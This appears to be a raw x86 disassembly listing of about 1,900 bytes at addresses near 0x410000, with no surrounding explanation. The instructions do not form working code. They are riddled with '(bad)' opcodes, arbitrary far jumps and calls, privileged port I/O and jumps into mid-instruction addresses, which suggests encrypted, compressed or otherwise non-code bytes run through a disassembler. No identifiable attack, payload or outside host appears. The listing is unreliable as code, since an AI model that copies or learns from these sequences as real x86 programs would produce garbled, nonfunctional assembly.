  41019f:	inc    ecx
  4101a0:	dec    ecx
  4101a1:	pusha  
  4101a2:	xor    WORD PTR [edx-0x4690024a],di
  4101a9:	mov    edx,0x578cdeec
  4101ae:	push   es
  4101af:	xor    al,0xa2
  4101b1:	fwait
  4101b2:	xor    DWORD PTR [ebp-0x2f5fa6e],ecx
  4101b8:	leave  
  4101b9:	mov    ds:0x768afed9,eax
  4101be:	lock dec esi
  4101c0:	jge    0x4101de
  4101c2:	pop    esi
  4101c3:	daa    
  4101c4:	int3   
  4101c5:	xor    DWORD PTR [ecx],eax
  4101c7:	push   edx
  4101c8:	jmp    0x5d45:0xb1c09efe
  4101cf:	ret    0x5cfb
  4101d2:	imul   ebp,DWORD PTR [ebp+0x1718c40c],0xffffff9a
  4101d9:	outs   dx,DWORD PTR ds:[esi]
  4101da:	leave  
  4101db:	outs   dx,BYTE PTR ds:[esi]
  4101dc:	retf   
  4101dd:	or     DWORD PTR es:[edx-0xe],ecx
  4101e1:	sub    BYTE PTR [edx+0x52802584],dl
  4101e7:	cmp    BYTE PTR cs:[eax],bl
  4101ea:	jns    0x41021b
  4101ec:	mov    cl,al
  4101ee:	retf   
  4101ef:	call   0xd27d:0xebcee7d7
  4101f6:	sub    al,0x37
  4101f8:	pop    eax
  4101f9:	imul   DWORD PTR [edx]
  4101fb:	in     eax,0xe7
  4101fd:	je     0x410271
  4101ff:	or     edx,DWORD PTR [ebx]
  410201:	jmp    0xa5e0:0xa2185d
  410208:	and    al,0xdf
  41020a:	sub    ebp,DWORD PTR [ecx+0x7]
  41020d:	pusha  
  41020e:	push   ebx
  41020f:	in     eax,dx
  410210:	cs dec ebx
  410212:	(bad)  [ecx+edi*1-0x76]
  410216:	inc    esi
  410217:	adc    eax,0x5b3a6f52
  41021c:	push   0xe
  41021e:	ror    eax,cl
  410220:	sahf   
  410221:	or     dh,dh
  410223:	mov    al,ds:0x871d57b4
  410228:	jmp    0x4101c3
  41022a:	dec    ecx
  41022b:	(bad)  
  41022d:	add    esp,edi
  41022f:	in     eax,0xd0
  410231:	adc    eax,0xfde371c0
  410236:	addr16 xchg ebp,eax
  410238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410239:	jns    0x410251
  41023b:	jle    0x410250
  41023d:	ror    ah,cl
  41023f:	pop    ebp
  410240:	outs   dx,DWORD PTR ds:[esi]
  410241:	lock jmp 0x41025d
  410244:	sub    al,BYTE PTR [ecx+0x14]
  410247:	(bad)  
  410248:	and    DWORD PTR [edi+0x47],edi
  41024b:	jne    0x410264
  41024d:	adc    eax,0x493b227a
  410252:	mov    ebp,0x2b6e9370
  410257:	mov    ds:0xc4155d9f,al
  41025c:	and    esi,DWORD PTR [ebp+0x25aa71f6]
  410262:	lahf   
  410263:	push   eax
  410264:	mov    ecx,0x2ae54acf
  410269:	arpl   WORD PTR [ebx-0x10],ax
  41026c:	pop    edx
  41026d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41026e:	dec    esi
  41026f:	xchg   esi,eax
  410270:	ds dec edi
  410272:	push   cs
  410273:	loope  0x410249
  410275:	lea    edi,[esi+0x5ef3d98e]
  41027b:	or     bh,BYTE PTR [edi-0x32e410f2]
  410281:	aam    0x68
  410283:	inc    esp
  410284:	mov    WORD PTR [ebp+0x636912fe],?
  41028a:	jnp    0x4102ff
  41028c:	(bad)  
  41028d:	xchg   edi,eax
  41028e:	dec    edx
  41028f:	test   al,0xc4
  410291:	mov    dh,0xea
  410293:	rcr    BYTE PTR cs:[ebp-0x7195f9ad],cl
  41029a:	and    ebx,DWORD PTR [esp+esi*2-0x1b]
  41029e:	mov    bh,bh
  4102a0:	xchg   ebx,eax
  4102a1:	pop    ebx
  4102a2:	fmulp  st(2),st
  4102a4:	fadd   QWORD PTR [ecx+0xd]
  4102a7:	mov    ds:0x49f8597e,al
  4102ac:	ja     0x410292
  4102ae:	shl    BYTE PTR [edx-0x77],1
  4102b1:	fs addr16 lahf 
  4102b4:	test   DWORD PTR [edi+0x247b012f],ecx
  4102ba:	hlt    
  4102bb:	arpl   WORD PTR [edi],sp
  4102bd:	call   0x996a:0x5f947b62
  4102c4:	jmp    0x41025f
  4102c6:	pushf  
  4102c7:	xchg   ebp,eax
  4102c8:	fist   WORD PTR [eax]
  4102ca:	call   0xf5e78ca8
  4102cf:	gs dec ebx
  4102d1:	fstp   st(7)
  4102d3:	sub    DWORD PTR [esi+ebx*1+0x19],ebx
  4102d7:	cmp    ebp,0xd2616366
  4102dd:	mov    dl,0x11
  4102df:	popa   
  4102e0:	dec    ebx
  4102e1:	dec    ebx
  4102e2:	ja     0x410351
  4102e4:	ins    BYTE PTR es:[edi],dx
  4102e5:	btc    DWORD PTR [eax],ebp
  4102e8:	cmp    al,0x5e
  4102ea:	test   eax,0x580b7a76
  4102ef:	add    DWORD PTR [eax+0x4af581f6],ecx
  4102f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102f6:	(bad)  
  4102f8:	fadd   QWORD PTR [ecx]
  4102fa:	dec    DWORD PTR [ecx]
  4102fc:	cld    
  4102fd:	xor    eax,DWORD PTR [edi+0xa723225]
  410303:	jp     0x4102b0
  410305:	std    
  410306:	ss ins DWORD PTR es:[edi],dx
  410308:	xchg   ebp,eax
  410309:	enter  0x1a3d,0xd3
  41030d:	enter  0x9019,0x27
  410311:	sub    cl,BYTE PTR [ebx-0x57]
  410314:	pop    ds
  410315:	mov    edi,0x29a4382d
  41031a:	dec    ebx
  41031b:	add    ebx,ecx
  41031d:	imul   esp,edx,0x510e3288
  410323:	loopne 0x4102e8
  410325:	jmp    0x345a5f43
  41032a:	xchg   ebp,eax
  41032b:	mov    esp,0x436a3182
  410330:	mov    eax,ds:0x381c6b76
  410335:	call   0xbe12:0x7cb80aa5
  41033c:	out    0xdb,eax
  41033e:	fst    DWORD PTR [ecx*2+0x42ba73d0]
  410345:	lds    ecx,FWORD PTR [eax-0x4]
  410348:	fist   DWORD PTR ds:0xb12fa900
  41034e:	dec    eax
  41034f:	jp     0x41035a
  410351:	les    eax,FWORD PTR [esi-0x57]
  410354:	loop   0x41036e
  410356:	and    DWORD PTR [esi+0x76],eax
  410359:	xor    eax,0x76df3d75
  41035e:	cmp    edx,esi
  410360:	push   esi
  410361:	and    DWORD PTR [eax+0x4333796c],ecx
  410367:	imul   esi,DWORD PTR [ebp+0x62],0x8cad1d49
  41036e:	push   ecx
  41036f:	outs   dx,BYTE PTR ds:[esi]
  410370:	adc    ecx,DWORD PTR [esi-0x5d]
  410373:	mov    edx,0xd0ea3b7a
  410378:	cmp    edx,DWORD PTR [edx+0x348792f8]
  41037e:	inc    esi
  41037f:	or     eax,0xa2f2f9be
  410384:	mov    ebp,0x2caabc71
  410389:	mov    ah,0xc5
  41038b:	sub    esp,DWORD PTR [edx+eiz*8+0x7]
  41038f:	int    0xe9
  410391:	sub    ebx,ebp
  410393:	test   ecx,edx
  410395:	inc    ebx
  410396:	(bad)  
  410398:	fimul  DWORD PTR [esi+0x4c8677fd]
  41039e:	pop    eax
  41039f:	out    0x26,eax
  4103a1:	mov    BYTE PTR [esi],bl
  4103a3:	fldcw  WORD PTR [ecx+0x7d]
  4103a6:	dec    ebp
  4103a7:	xchg   ebp,eax
  4103a8:	xchg   ebx,eax
  4103a9:	sub    DWORD PTR [eax+eiz*1+0x33],ecx
  4103ad:	inc    edi
  4103af:	cdq    
  4103b0:	out    dx,al
  4103b1:	mov    eax,ds:0xf93f8cc
  4103b6:	push   ds
  4103b7:	pop    ebp
  4103b8:	xchg   DWORD PTR [esi],edi
  4103ba:	imul   ebp,DWORD PTR [eax],0x68
  4103bd:	cmp    eax,0x1cb16368
  4103c2:	mov    bh,0x32
  4103c4:	mov    ds:0xae19635c,eax
  4103c9:	mov    bh,0xdc
  4103cb:	int3   
  4103cc:	mov    ds:0x3a221bee,al
  4103d1:	fstp   QWORD PTR gs:[edi-0x88ff087]
  4103d8:	push   edi
  4103d9:	imul   esp,eax,0x33
  4103dc:	mov    fs,WORD PTR [ecx+0x36]
  4103df:	lods   al,BYTE PTR ds:[esi]
  4103e0:	cmp    eax,0x7e3e4b63
  4103e5:	jl     0x41041a
  4103e7:	clc    
  4103e8:	jo     0x410451
  4103ea:	(bad)  
  4103eb:	dec    BYTE PTR [eax+0x33]
  4103ee:	dec    edi
  4103ef:	aas    
  4103f0:	pop    es
  4103f1:	addr16 fcmovu st,st(7)
  4103f4:	cwde   
  4103f5:	sbb    DWORD PTR [edi],ecx
  4103f7:	pop    esi
  4103f8:	test   eax,0x84c32d75
  4103fd:	xchg   ebp,eax
  4103fe:	xchg   esp,eax
  4103ff:	xor    bh,BYTE PTR [esi]
  410401:	pop    ss
  410402:	adc    eax,0xf35ff82a
  410407:	or     eax,0x21a271df
  41040c:	jl     0x4103a0
  41040e:	add    ah,BYTE PTR [ebx-0x6b473233]
  410414:	jmp    0xf55b60aa
  410419:	std    
  41041a:	add    ecx,edx
  41041c:	pop    es
  41041d:	adc    DWORD PTR [esi],ebx
  41041f:	sub    al,0x3c
  410421:	xchg   DWORD PTR [edi-0x50],ecx
  410424:	rcl    BYTE PTR [ebp-0x3f],1
  410427:	(bad)  
  410428:	dec    esi
  410429:	test   DWORD PTR [esp],ecx
  41042c:	pop    esi
  41042d:	or     eax,0x9b76a8dc
  410432:	mov    ebx,DWORD PTR [edx+ebx*8+0x63]
  410436:	mov    es,WORD PTR [ebx+0x4f]
  410439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41043a:	outs   dx,BYTE PTR ds:[esi]
  41043b:	push   esp
  41043c:	scas   eax,DWORD PTR es:[edi]
  41043d:	ja     0x4103cc
  41043f:	std    
  410440:	outs   dx,BYTE PTR ds:[esi]
  410441:	xchg   esp,eax
  410442:	leave  
  410443:	ficom  WORD PTR [eax+0x67]
  410446:	adc    cl,ch
  410448:	sub    dh,BYTE PTR [edx*2+0x123dbe4f]
  41044f:	ret    0x80b3
  410452:	cmp    eax,0xfe4db12c
  410457:	call   0x5d83:0x20873732
  41045e:	shl    DWORD PTR [edi+ecx*1],1
  410461:	or     DWORD PTR [eax],ecx
  410463:	dec    eax
  410464:	in     eax,dx
  410465:	inc    esp
  410466:	data16 jnp 0x4104be
  410469:	push   cs
  41046a:	ins    DWORD PTR es:[edi],dx
  41046b:	test   eax,0xb4787dbf
  410470:	pop    es
  410471:	fninit 
  410473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410474:	mov    al,0xee
  410476:	test   DWORD PTR [edx-0xda2c52b],0xf3f58e6b
  410480:	push   esp
  410481:	fld    DWORD PTR [ebp-0x2d02b105]
  410487:	test   al,0x57
  410489:	retf   0x2d80
  41048c:	jbe    0x410442
  41048e:	inc    esi
  41048f:	adc    ch,ch
  410491:	bound  edx,QWORD PTR ds:0xb484d4
  410497:	nop
  410498:	push   ss
  410499:	imul   ebp,DWORD PTR [ebx+eiz*4-0x1bb0b6df],0xb6f6c0b9
  4104a4:	sbb    al,BYTE PTR [edx-0x1852ebbb]
  4104aa:	rep ins BYTE PTR es:[edi],dx
  4104ac:	daa    
  4104ad:	add    cl,BYTE PTR [ecx+ebp*8+0x4678166c]
  4104b4:	jle    0x4104ec
  4104b6:	lods   eax,DWORD PTR ds:[esi]
  4104b7:	jl     0x410498
  4104b9:	pop    edx
  4104ba:	scas   al,BYTE PTR es:[edi]
  4104bb:	add    bh,BYTE PTR [eax+edi*1]
  4104be:	ret    
  4104bf:	rol    DWORD PTR [edx-0x20],cl
  4104c2:	data16 cmp BYTE PTR [ebx+0x5e4fd5d],bh
  4104c9:	pop    ebx
  4104ca:	out    0x3a,al
  4104cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104cd:	add    al,0x1d
  4104cf:	pop    esi
  4104d0:	retf   0xf158
  4104d3:	outs   dx,BYTE PTR ds:[esi]
  4104d4:	mov    BYTE PTR [edi+0x2aeb86dc],dh
  4104da:	mov    WORD PTR [esi+0x0],es
  4104dd:	adc    BYTE PTR [edx-0x5476ff45],0xe3
  4104e4:	dec    ebp
  4104e5:	(bad)  
  4104e6:	jns    0x410550
  4104e8:	(bad)  
  4104e9:	fidiv  DWORD PTR [edx+0x30eba189]
  4104ef:	(bad)  
  4104f0:	call   0x9d86:0x906b0a91
  4104f7:	das    
  4104f8:	cmp    edi,DWORD PTR [ecx+0xc]
  4104fb:	mov    ecx,ebx
  4104fd:	add    DWORD PTR [esi+0x263deb99],ecx
  410503:	bound  esi,QWORD PTR [edi+edi*2]
  410506:	sbb    al,0x1b
  410508:	xchg   cl,bh
  41050a:	sti    
  41050b:	sbb    ecx,ebp
  41050d:	xchg   esp,eax
  41050e:	retf   
  41050f:	mov    eax,ds:0x88637754
  410514:	inc    eax
  410515:	mov    edi,ebp
  410517:	inc    ebp
  410518:	pop    edi
  410519:	jle    0x410585
  41051b:	stos   DWORD PTR es:[edi],eax
  41051c:	ja     0x410573
  41051e:	mov    dh,0x30
  410520:	iret   
  410521:	pop    ds
  410522:	call   0xdd2d8d0e
  410527:	out    dx,eax
  410528:	retf   0x3c5
  41052b:	mov    cl,0xac
  41052d:	mov    BYTE PTR ds:[ecx],cl
  410530:	push   eax
  410531:	dec    BYTE PTR [ebp+ecx*4-0x76]
  410535:	push   ds
  410536:	inc    ecx
  410537:	fnstcw WORD PTR [edi+eiz*2-0x35]
  41053b:	cdq    
  41053c:	fstp   TBYTE PTR [edi+0x2efce3c3]
  410542:	push   esp
  410543:	mov    dh,0x12
  410545:	xlat   BYTE PTR ds:[ebx]
  410546:	sub    eax,0xa49f10ec
  41054b:	adc    bp,bx
  41054e:	mov    es:0xa8ba0a01,al
  410554:	jae    0x410509
  410556:	gs es push esp
  410559:	(bad)  
  41055a:	sub    bh,BYTE PTR [edx+0x3295a87]
  410560:	dec    esi
  410561:	mov    esi,0xf2cfc2c
  410566:	pop    ds
  410567:	icebp  
  410568:	sub    DWORD PTR [ecx+0x62],edi
  41056b:	push   ss
  41056c:	out    dx,eax
  41056d:	lods   al,BYTE PTR ds:[esi]
  41056e:	iret   
  41056f:	outs   dx,BYTE PTR ds:[esi]
  410570:	mov    cs,ebp
  410572:	fadd   QWORD PTR [ebx]
  410574:	push   0x47efeeec
  410579:	loopne 0x410545
  41057b:	shl    BYTE PTR [esi+0x6bf86d7c],1
  410581:	retf   0xe883
  410584:	lock jnp 0x4105c2
  410587:	bound  edx,QWORD PTR [ebp-0x266c5719]
  41058d:	dec    ebx
  41058e:	sti    
  41058f:	out    dx,al
  410590:	scas   al,BYTE PTR es:[edi]
  410591:	lahf   
  410592:	sbb    esi,DWORD PTR [eax-0xf]
  410595:	adc    BYTE PTR [edx+0x5e],ch
  410598:	jns    0x410612
  41059a:	cli    
  41059b:	sub    al,BYTE PTR [ebx-0x7c881ffa]
  4105a1:	lfs    eax,FWORD PTR [ebp+0x654038b3]
  4105a8:	loop   0x410621
  4105aa:	cmp    edi,DWORD PTR [ebx]
  4105ac:	mov    ecx,0xb79296fb
  4105b1:	xchg   edi,eax
  4105b2:	imul   DWORD PTR [edi-0x88b26cd]
  4105b8:	add    al,0x90
  4105ba:	mov    WORD PTR [edi+ebx*2],ds
  4105bd:	push   cs
  4105be:	lahf   
  4105bf:	jb     0x41058a
  4105c1:	pop    esi
  4105c2:	inc    edx
  4105c3:	std    
  4105c4:	mov    esp,0xb1932cf4
  4105c9:	adc    eax,DWORD PTR [eax+0x549a59fa]
  4105cf:	test   eax,0x9aa4b97b
  4105d4:	addr16 push ecx
  4105d6:	adc    BYTE PTR ds:0x29e9a494,cl
  4105dc:	dec    eax
  4105dd:	pop    ecx
  4105de:	loope  0x41062f
  4105e0:	fwait
  4105e1:	(bad)  
  4105e2:	in     eax,dx
  4105e3:	xchg   esi,eax
  4105e4:	sbb    BYTE PTR [esi],ch
  4105e6:	pop    ebp
  4105e7:	adc    DWORD PTR [ecx-0x8e5c970],ecx
  4105ed:	loop   0x41061f
  4105ef:	push   ebx
  4105f0:	adc    dh,BYTE PTR [edi-0x10499462]
  4105f6:	dec    BYTE PTR ds:0x71cbe17b
  4105fc:	xor    BYTE PTR [ecx-0x5b3d0a6d],al
  410602:	out    0xe5,eax
  410604:	and    BYTE PTR [edi-0x67],dl
  410607:	sub    ebp,edi
  410609:	cwde   
  41060a:	xor    eax,0x57706754
  41060f:	mov    esi,DWORD PTR [ebx-0x15]
  410612:	jmp    DWORD PTR [esi-0x4d]
  410615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410616:	aaa    
  410617:	pushf  
  410618:	pop    edi
  410619:	inc    esp
  41061a:	rol    DWORD PTR [esi+eiz*2-0x287fdd8c],1
  410621:	mov    ah,al
  410623:	cmp    BYTE PTR [eax+0x48],0x5
  410627:	(bad)  
  410628:	mov    al,0x88
  41062a:	inc    ebx
  41062b:	mov    ch,0x56
  41062d:	sbb    eax,edx
  41062f:	xor    bh,BYTE PTR [edx-0x57337053]
  410635:	sahf   
  410636:	add    BYTE PTR [eax+0x1e],bl
  410639:	inc    edx
  41063a:	push   ecx
  41063b:	dec    eax
  41063c:	or     ebx,DWORD PTR [ecx]
  41063e:	sub    bl,BYTE PTR [ebx-0xdce602c]
  410644:	xor    ch,dl
  410646:	ret    
  410647:	out    dx,al
  410648:	sbb    esp,ebx
  41064a:	(bad)  
  41064b:	cmp    DWORD PTR [eax-0x4bc25e86],edx
  410651:	test   BYTE PTR [edi],ah
  410653:	enter  0x57b0,0x50
  410657:	add    DWORD PTR [edx],esi
  410659:	aaa    
  41065a:	jle    0x4106c3
  41065c:	sar    edx,cl
  41065e:	fcomp  DWORD PTR [ecx+edi*8+0x24]
  410662:	xor    DWORD PTR [ecx],eax
  410664:	into   
  410665:	xlat   BYTE PTR ds:[ebx]
  410666:	push   ebp
  410667:	arpl   WORD PTR [ebp+0x5617ad3e],cx
  41066d:	add    eax,0x7fcaf7c1
  410672:	sar    DWORD PTR [esp+edx*8-0x76f8f8a8],cl
  410679:	enter  0xd932,0x1e
  41067d:	scas   al,BYTE PTR es:[edi]
  41067e:	dec    eax
  41067f:	jbe    0x410650
  410681:	xor    edi,DWORD PTR [ebp-0x30b2a640]
  410687:	jecxz  0x410616
  410689:	cmp    dh,BYTE PTR [ecx]
  41068b:	es xchg edx,eax
  41068d:	iret   
  41068e:	push   esp
  41068f:	fmulp  st(5),st
  410691:	out    dx,al
  410692:	cmp    al,0x56
  410694:	out    dx,eax
  410695:	pusha  
  410696:	dec    eax
  410697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410698:	mov    al,0x78
  41069a:	loopne 0x410621
  41069c:	lock pop edx
  41069e:	ins    DWORD PTR es:[edi],dx
  41069f:	lds    ecx,FWORD PTR [eax]
  4106a1:	xchg   ebp,eax
  4106a2:	jmp    0x4106f0
  4106a4:	adc    dl,bh
  4106a6:	sbb    al,bh
  4106a8:	and    bl,BYTE PTR [ebx]
  4106aa:	mov    ds:0xfd7bbcf4,al
  4106af:	stc    
  4106b0:	push   es
  4106b1:	stos   BYTE PTR es:[edi],al
  4106b2:	dec    edx
  4106b3:	cwde   
  4106b4:	and    DWORD PTR [ebx+0x40c05b87],ebp
  4106ba:	push   esp
  4106bb:	xchg   esp,eax
  4106bc:	repz (bad) 
  4106be:	dec    edi
  4106bf:	lods   al,BYTE PTR ds:[esi]
  4106c0:	shl    DWORD PTR [ecx],1
  4106c2:	or     esi,ebp
  4106c4:	jns    0x410661
  4106c6:	out    0x66,al
  4106c8:	test   eax,0x9c0eeb2b
  4106cd:	add    dh,BYTE PTR [edi]
  4106cf:	cdq    
  4106d0:	in     eax,0x2a
  4106d2:	jl     0x410664
  4106d4:	popf   
  4106d5:	scas   eax,DWORD PTR es:[edi]
  4106d6:	nop
  4106d7:	inc    edi
  4106d8:	js     0x410759
  4106da:	xchg   ecx,eax
  4106db:	(bad)  
  4106dc:	data16 fs (bad) 
  4106df:	fs push cs
  4106e1:	cdq    
  4106e2:	repz aad 0xe
  4106e5:	mov    al,ds:0x2058b0f2
  4106ea:	xchg   esp,eax
  4106eb:	loope  0x41075d
  4106ed:	stos   BYTE PTR es:[edi],al
  4106ee:	bnd call 0x1e0116b6
  4106f4:	cmp    eax,0x43a2c1de
  4106f9:	nop
  4106fa:	and    ebx,ebx
  4106fc:	xchg   BYTE PTR [ecx+0x66b2364c],al
  410702:	repnz bound edx,QWORD PTR [ecx]
  410705:	popa   
  410706:	mov    dl,0x22
  410708:	ins    DWORD PTR es:[edi],dx
  410709:	inc    edi
  41070a:	sbb    eax,0xbe58d61e
  41070f:	xor    DWORD PTR [ebp-0x1e],ecx
  410712:	lods   al,BYTE PTR ds:[esi]
  410713:	xor    BYTE PTR [ebp+0x5e],cl
  410716:	addr16 xchg ecx,eax
  410718:	xor    DWORD PTR [ebp-0x2ee14981],ebp
  41071e:	shl    eax,1
  410720:	xor    al,0x8d
  410722:	into   
  410723:	lock jle 0x410763
  410726:	scas   al,BYTE PTR es:[edi]
  410727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410728:	in     al,0x8c
  41072a:	cmp    ch,BYTE PTR [ecx-0x4b]
  41072d:	push   edi
  41072e:	push   ebx
  41072f:	cmp    edx,ecx
  410731:	jmp    DWORD PTR [ebx-0x5fd927da]
  410737:	out    dx,eax
  410738:	mov    WORD PTR [ebx+0x69],ss
  41073b:	mov    ds:0xb9fa6e24,eax
  410740:	cld    
  410741:	enter  0x2596,0x50
  410745:	add    ebx,DWORD PTR [edi-0x8]
  410748:	adc    eax,0xa8f7e475
  41074d:	lock scas al,BYTE PTR es:[edi]
  41074f:	div    DWORD PTR [ebx-0x6b]
  410752:	sbb    eax,0xb6b0f648
  410757:	(bad)  
  410758:	jbe    0x410781
  41075a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41075b:	js     0x410728
  41075d:	xchg   BYTE PTR [edi+0x6d],bl
  410760:	push   ds
  410761:	test   BYTE PTR [eax+0x58437b9e],bh
  410767:	cdq    
  410768:	aam    0xe7
  41076a:	fwait
  41076b:	inc    BYTE PTR [esi+0x6]
  41076e:	stos   DWORD PTR es:[edi],eax
  41076f:	adc    DWORD PTR [edx+ebp*4],0x7ca1140
  410776:	mov    ds:0xb44cef80,eax
  41077b:	push   ss
  41077c:	fist   DWORD PTR [edx]
  41077e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41077f:	daa    
  410780:	push   ebx
  410781:	adc    bl,dh
  410783:	adc    al,0x17
  410785:	(bad)  
  410786:	fbld   TBYTE PTR [esi]
  410788:	inc    esp
  410789:	push   ds
  41078a:	adc    eax,0xc6508180
  41078f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410790:	cmp    BYTE PTR [ecx-0x428d3cd9],0x74
  410797:	retf   0xa64
  41079a:	clc    
  41079b:	sub    eax,0xffffff81
  41079e:	xchg   ebx,eax
  41079f:	sbb    eax,0xf8bb28f4
  4107a4:	not    BYTE PTR ds:0x2b17b5ea
  4107aa:	push   esi
  4107ab:	mov    bl,0x31
  4107ad:	or     DWORD PTR [esi],ecx
  4107af:	mov    bh,bh
  4107b1:	add    eax,0x92d55dae
  4107b6:	mov    ds:0x61facc35,eax
  4107bb:	lods   al,BYTE PTR ds:[esi]
  4107bc:	pop    edi
  4107bd:	fdivr  st(3),st
  4107bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c0:	mov    ecx,0x866e545f
  4107c5:	or     BYTE PTR [ecx+esi*2-0x7ca118c0],ch
  4107cc:	cmp    al,0x7
  4107ce:	fcmovnb st,st(4)
  4107d0:	push   es
  4107d1:	rcl    BYTE PTR [esi],0xea
  4107d4:	in     al,dx
  4107d5:	ins    DWORD PTR es:[edi],dx
  4107d6:	jmp    0x4107b8
  4107d8:	out    dx,al
  4107d9:	sar    DWORD PTR [ecx-0x72],1
  4107dc:	cs ror dl,0xd
  4107e0:	mov    ecx,0x8c73cb55
  4107e5:	mov    eax,DWORD PTR [edx]
  4107e7:	push   ecx
  4107e8:	add    ecx,edi
  4107ea:	add    al,0x2d
  4107ec:	and    al,0x54
  4107ee:	xlat   BYTE PTR ds:[ebx]
  4107ef:	hlt    
  4107f0:	int3   
  4107f1:	in     eax,dx
  4107f2:	pop    es
  4107f3:	xchg   BYTE PTR [edx+0x6cd7d8da],ah
  4107f9:	mov    al,0xb9
  4107fb:	push   es
  4107fc:	xor    esp,DWORD PTR [ebx+ecx*4+0x47e341ac]
  410803:	jnp    0x410851
  410805:	call   0x644b12fb
  41080a:	pop    es
  41080b:	mov    BYTE PTR [esp+ebp*4+0x58],al
  41080f:	int    0x36
  410811:	xchg   BYTE PTR [edx-0x41],al
  410814:	aas    
  410815:	mov    bh,BYTE PTR [eax-0x3015c12c]
  41081b:	addr16 mov edx,0x510a7a6b
  410821:	sub    ah,BYTE PTR [edx-0x61732fb2]
  410827:	push   0xae4c0148
  41082c:	pop    ds
  41082d:	push   ds
  41082e:	cmp    bh,BYTE PTR [ebp-0x63e410cf]
  410834:	jg     0x410861
  410836:	cld    
  410837:	loop   0x410805
  410839:	test   al,0x56
  41083b:	call   0x54032652
  410840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410841:	pushf  
  410842:	in     al,dx
  410843:	and    al,BYTE PTR [eax]
  410845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410846:	(bad)
  410849:	outs   dx,BYTE PTR ds:[esi]
  41084a:	fld    DWORD PTR [ecx+edx*1]
  41084d:	or     eax,0xf931235b
  410852:	aam    0x79
  410854:	call   0x5a533526
  410859:	sub    eax,0xd5b79b91
  41085e:	mov    WORD PTR [edi+eiz*4],es
  410861:	popa   
  410862:	outs   dx,BYTE PTR ds:[esi]
  410863:	push   ebp
  410864:	fistp  WORD PTR [esi+0x9]
  410867:	xchg   edx,eax
  410868:	in     eax,0x68
  41086a:	mov    ds:0x7fd6e9e9,eax
  41086f:	push   es
  410870:	loop   0x4108c9
  410872:	jb     0x4108a2
  410874:	xor    esi,ebp
  410876:	mov    es,WORD PTR [ebx-0x45099f5d]
  41087c:	sub    edi,edx
  41087e:	je     0x410810
  410880:	loopne 0x4108d1
  410882:	jg     0x410819
  410884:	inc    edi
  410885:	imul   ebx,DWORD PTR [eax-0x44],0xffffffc1
  410889:	test   al,0x28
  41088b:	mov    cl,0xdc
  41088d:	and    DWORD PTR [eax+0x5ec6b823],eax
  410893:	ja     0x4108c3
  410895:	arpl   WORD PTR [edi],cx
  410897:	jns    0x4108df
  410899:	lea    esp,[eax-0x6c]
  41089c:	ss jae 0x4108c2
  41089f:	lods   eax,DWORD PTR ds:[esi]
  4108a0:	inc    edx
  4108a1:	pop    edi
  4108a2:	icebp  
  4108a3:	xchg   edx,eax
  4108a4:	sbb    eax,0xce611908
  4108a9:	punpckhwd mm6,QWORD PTR [eax]
  4108ac:	sub    DWORD PTR [ecx+0x3d],edx
  4108af:	xchg   ecx,eax
  4108b0:	pop    ebp
  4108b1:	jbe    0x410896
  4108b3:	pop    ds
  4108b4:	adc    bh,al
  4108b6:	gs scas al,BYTE PTR es:[edi]
  4108b8:	repnz inc edx
  4108ba:	xchg   edx,eax
  4108bb:	cdq    
  4108bc:	or     BYTE PTR [edi],dl
  4108be:	xchg   ebp,eax
  4108bf:	out    0x27,al
  4108c1:	gs out 0x4e,al
  4108c4:	sar    DWORD PTR [ecx],cl
  4108c6:	sub    BYTE PTR [eax+0x26],bl
  4108c9:	cwde   
  4108ca:	pop    ebp
  4108cb:	pop    edi
  4108cc:	xor    al,0xc2
  4108ce:	lahf   
  4108cf:	test   eax,0x1a60f8ea
  4108d4:	or     eax,0x47c82a3e
  4108d9:	clc    
  4108da:	xor    eax,0xadc68a63
  4108df:	add    bh,ah
  4108e1:	jg     0x410936
  4108e3:	rol    BYTE PTR [edx],0x46
  4108e6:	mov    dl,0x93
  4108e8:	mov    esp,eax
  4108ea:	popf   
  4108eb:	test   DWORD PTR [eax],ebx
  4108ed:	pusha  
  4108ee:	stos   BYTE PTR es:[edi],al
  4108ef:	out    dx,eax
  4108f0:	or     BYTE PTR [ebx+0x6832571],ah
  4108f6:	jmp    0xa36179b4
  4108fb:	retf   
  4108fc:	push   esi
  4108fd:	mov    ecx,0x3e82a34b
  410902:	cmp    al,0xdd
  410904:	mov    esi,0xf8f2581e
  410909:	test   al,0x54
  41090b:	push   esp
  41090c:	loopne 0x410913
  41090e:	xor    al,0xf2
  410910:	fisub  DWORD PTR [eax-0x19640b5b]
  410916:	sub    edx,esi
  410918:	jp     0x41089e
  41091a:	mov    fs,ebp
  41091c:	jecxz  0x410993
  41091e:	or     eax,0xdf60402
  410923:	push   cs
  410924:	pop    esi
  410925:	aad    0xd3
  410927:	mov    ebp,0xc18b4e19
  41092c:	pop    ds
  41092d:	aaa    
  41092e:	mov    cl,0x50
  410930:	dec    edx
  410931:	jb     0x41098d
  410933:	bnd jp 0x4108d0
  410936:	shr    BYTE PTR [ebx],0x8b
  410939:	sbb    ch,BYTE PTR [esi+0x26408f80]
  41093f:	xchg   ecx,eax
  410940:	cmp    DWORD PTR [ecx-0x7a2d0e57],ebp
  410946:	adc    ebp,DWORD PTR [ebx]
  410948:	and    ecx,esp
  41094a:	cmp    dl,BYTE PTR [ecx]
  41094c:	enter  0x480d,0x3f
  410950:	(bad)  [edx-0x3d]
  410953:	lds    eax,FWORD PTR [ecx+0x50]
  410956:	arpl   WORD PTR [ecx],cx
  410958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410959:	jmp    0x780e2b8b
  41095e:	(bad)  
  41095f:	sub    bh,BYTE PTR [esi]
  410961:	ds cmp bl,dh
  410964:	sub    DWORD PTR [edi-0x45],esp
